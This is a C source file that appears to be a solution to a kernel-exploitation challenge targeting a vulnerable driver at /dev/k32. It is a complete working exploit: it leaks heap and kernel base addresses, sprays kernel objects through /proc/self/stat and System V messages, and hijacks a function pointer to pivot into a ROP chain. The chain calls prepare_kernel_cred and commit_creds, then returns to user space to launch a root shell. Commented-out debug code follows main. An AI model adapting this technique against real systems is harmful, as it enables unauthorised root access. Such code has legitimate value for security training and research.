#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>
#define MSG_SPRAY_SIZE 0x20
#define SPRAY_SIZE 0x200

int k32_fd;


typedef struct 
{
    char* data;
    uint8_t size;
    uint32_t idx;
} req_t;


req_t *req;
int pfd[SPRAY_SIZE];
int mid[MSG_SPRAY_SIZE];
unsigned long user_cs, user_sp, user_ss, user_rflags;
unsigned long heap, base, buf;
unsigned long ret_148, add_rsp_40, pivot;
unsigned long pop_rdi, pop_rsi, prepare_kernel_creds, commit_creds, xchange_rdi_rax, kpti_tampoline, init_cred;

unsigned long* payload;
char tmp[0x10];

void error(char* msg){
    printf("[-] %s\n", msg);
}

void success(char* msg){
    printf("[+] %s\n", msg);
}

void info(char* msg){
    printf("[*] %s\n", msg);
}


void save_state(void)
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    success("Saved state!");
}

void _create(uint8_t size){
    req->size = size;
    if(ioctl(k32_fd, 0xb10500a,req)){
        error("failed to create");
    }
}

void _read(uint32_t idx, uint8_t size, char* buf){
    req->idx = idx;
    req->size = size;
    req->data = buf;
    if(ioctl(k32_fd, 0xb10500c,req)){
        error("failed to read"); 
    }
}

void _write(uint32_t idx, char* data, uint8_t size){
    req->idx = idx;
    req->size = size;
    req->data = data;
    if(ioctl(k32_fd, 0xb10500d,req)){
        error("failed to write");
    }
}

void _delete(uint32_t idx){
    req->idx = idx;
    if(ioctl(k32_fd, 0xb10500b,req)){
        error("failed to delete");
    }
}

void offsets(){
    ret_148 = base + 0x1931e;
    add_rsp_40 = base + 0x2af875;
    pivot = base + 0x6050c;
    pop_rdi = base + 0x12352e;
    prepare_kernel_creds = base + 0x6e045;
    commit_creds = base + 0x06de51;
    init_cred = base + 0xe54500;
    xchange_rdi_rax = base + 0x0ef31f;
    kpti_tampoline = base + 0x600e10 + 49;
    return;
}

unsigned long leak_heap(){
    _create(0xee);
    unsigned long dump[4];
    _read(0, 0x20, (char*)dump);
    for(int i = 1; i < 6; i++){
        _create(0xee); 
    }
    return (dump[2] / 0x1000) * 0x1000;
}

void spray(){
    _create(0xee);
    for(int i = 0; i<SPRAY_SIZE; i++){
        pfd[i] = open("/proc/self/stat", O_RDONLY);
    }
    info("heap sprayed");
}

unsigned long leak_base(){
    unsigned long chef[5];
    _read(6, 0x28, (char*) chef);
    return chef[4]-0x1aa471;
}

void shell_pog(void){
    success("shell popped");
    printf("current id: %d\n", getuid());
    execve("/bin/bash", NULL, NULL);
    exit(0);
}

void prep_payload(){
    memset(payload, 0, 0x100);
    int i = 0;

    payload[i++] = 1;
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_creds;
    payload[i++] = pop_rdi;
    payload[i++] = heap;
    payload[i++] = xchange_rdi_rax;
    payload[i++] = commit_creds;
    payload[i++] = kpti_tampoline;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = (unsigned long)shell_pog;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;

    for(int chef = 0; chef < MSG_SPRAY_SIZE; chef++){
        mid[chef] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if(mid[chef] == -1){
            error("failed to create message");
        }

        for(int j = 0; j<4;j++){
            if(msgsnd(mid[chef], payload, 0x1000, 0))
                error("sending message failed");
        }
    }
}

void pwn(){
    memset(payload, 0, 0x100);
    payload[0] = 0;
    payload[1] = 0;
    payload[2] = 0;
    payload[3] = 0;

    payload[4] = ret_148;
    payload[5] = add_rsp_40;
    
    _write(6, (char*)payload, 0x30);
    info("payload written");
    for(int i = 0; i<SPRAY_SIZE;i++){
        register unsigned long r14  asm("r14");
        register unsigned long r13  asm("r13");
    
        r14 = pivot;
        r13 = heap+0x59000+0x30;

        read(pfd[i], tmp, 0x10);
    }
}

int main(int argc, char *argv[]){
    unsigned long ret;
    unsigned long long leaks;
	k32_fd = open("/dev/k32", O_RDONLY);
    save_state();

    req = (req_t*)malloc(sizeof(req_t));

    heap = leak_heap();
    printf("[!] heap: 0x%lx\n", heap);
    spray();
    base = leak_base();
    printf("[!] base: 0x%lx\n", base);
    payload = malloc(0x1000);
    offsets();
    prep_payload();
    info("starting pwn");
    pwn();
    return 0;
}
    //_create(0, 0x20);
    ////_create(1, 0x20);
    ////_create(2, 0x20);
    ////_create(3, 0x20);
    ////puts("created");
    ////_write(0, data, 16);
    ////_delete(1);

    //char* data = "AAAAAAAAAAAAAAAA\x60\x69";
    //char* data1 = "BBBBBBBBBBBBBBB\x00";
    //char* data2 = "CCCCCCC\x00";
    ////char* data3 = "DDDDDDDDDDDDDDD\x00";
    //
    //_write(0, data, 18);
    //_create(1, 0x32);
    //_write(1, data1, 16);

    //char* val;
    //_delete(1);
    //
    //_create(1, 0x20);
    //_write(1, data2, 8);
    //val = _read(1, 8);
    //printf("%s\n", val);
    //_delete(0);
    //_delete(1);
